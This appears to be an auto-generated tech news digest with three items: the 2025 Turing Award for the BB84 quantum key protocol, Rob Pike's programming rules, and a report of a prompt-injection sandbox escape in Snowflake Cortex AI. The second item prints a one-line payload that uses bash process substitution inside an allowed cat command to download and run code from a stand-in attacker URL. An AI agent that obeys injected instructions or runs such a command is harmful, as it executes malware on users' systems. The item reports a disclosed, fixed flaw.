## [Bennett and Brassard Win 2025 Turing Award for Quantum Information Science](https://awards.acm.org/about/2025-turing) ⭐️ 8.0/10

Charles H. Bennett and Gilles Brassard have been awarded the 2025 ACM A.M. Turing Award for their foundational work in establishing quantum information science and quantum cryptography, most notably through their invention of the BB84 quantum key distribution protocol in 1984. This marks the first time the Turing Award has recognized quantum information science, signaling its maturation as a fundamental discipline in computer science. The award highlights the growing importance of quantum-safe cryptography as quantum computers threaten current encryption systems. The BB84 protocol uses the quantum properties of photon polarization to enable two parties (Alice and Bob) to establish a shared secret key with theoretical security guaranteed by the laws of quantum mechanics. Any eavesdropping attempt disturbs the quantum states and can be detected.

hackernews · srvmshr · Mar 18, 10:10

**Background**: The Turing Award, often called the Nobel Prize of computing, is the highest honor in computer science. Quantum key distribution (QKD) exploits quantum indeterminacy and the no-cloning theorem to enable theoretically unbreakable encryption. Stephen Wiesner earlier proposed foundational quantum information-distribution protocols in the 1960s, though Bennett and Brassard's BB84 became the practical foundation for quantum cryptography.

## [Snowflake Cortex AI Sandbox Escape via Prompt Injection](https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything) ⭐️ 8.0/10

Security researcher documented a prompt injection attack on Snowflake Cortex AI that escaped the sandbox and executed malware by exploiting process substitution in allowed cat commands. This demonstrates a concrete attack vector for AI agents combining prompt injection with process substitution to bypass sandbox restrictions. It highlights the fundamental difficulty of securing command execution in LLM-powered tools. The exploit used `cat < <(sh < <(wget -q0- https://ATTACKER_URL.com/bugbot))` which exploits bash process substitution syntax. Snowflake had listed cat commands as safe without protecting against process substitution, and the vulnerability has been confirmed fixed.

rss · Simon Willison · Mar 18, 17:43

**Background**: Process substitution is a bash shell feature that allows command output to be treated as a file using the <() syntax. Prompt injection attacks trick AI agents into executing malicious commands by embedding hostile instructions in user inputs or documents they process. Sandboxing is meant to restrict what code AI agents can run, but this attack escaped that protection.

## [Rob Pike's Rules of Programming (1989)](https://www.cs.unc.edu/~stotts/COMP590-059-f24/robsrules.html) ⭐️ 7.0/10

Rob Pike's 1989 programming rules have resurfaced in a high-quality discussion, emphasizing measurement over prediction, writing simple code first, and only optimizing confirmed bottlenecks after profiling. These classic rules remain highly relevant as they directly address common productivity pitfalls—particularly the tendency toward premature abstraction and over-engineering that can delay project delivery and make code harder to maintain. The rules originated from Pike's work at Bell Labs. Community members note that Rule 1 (don't predict bottlenecks) makes Rules 3-5 follow logically—accepting unpredictability makes measurement the only rational strategy, and the real problem is often premature abstraction rather than premature optimization.

hackernews · vismit2000 · Mar 18, 09:59

**Background**: Rob Pike is a renowned programmer who worked at Bell Labs and later became one of the creators of Go. His programming rules were written in 1989 and have become classic wisdom in the software engineering community. The rules advocate for a pragmatic approach: write clear, simple code first, measure performance to find actual bottlenecks, and only optimize what profiling confirms is slow.

**Discussion**: Commenters widely connected Pike's rules to Jonathan Blow's productivity approach—Blow used simple arrays in Braid and only optimized after finding actual bottlenecks, arguing that trying to find optimal data structures upfront would have prevented shipping. Others emphasized that the real problem is premature abstraction (elaborate indirection) rather than premature optimization, and that iterative refinement of data structures often solves tricky problems naturally.
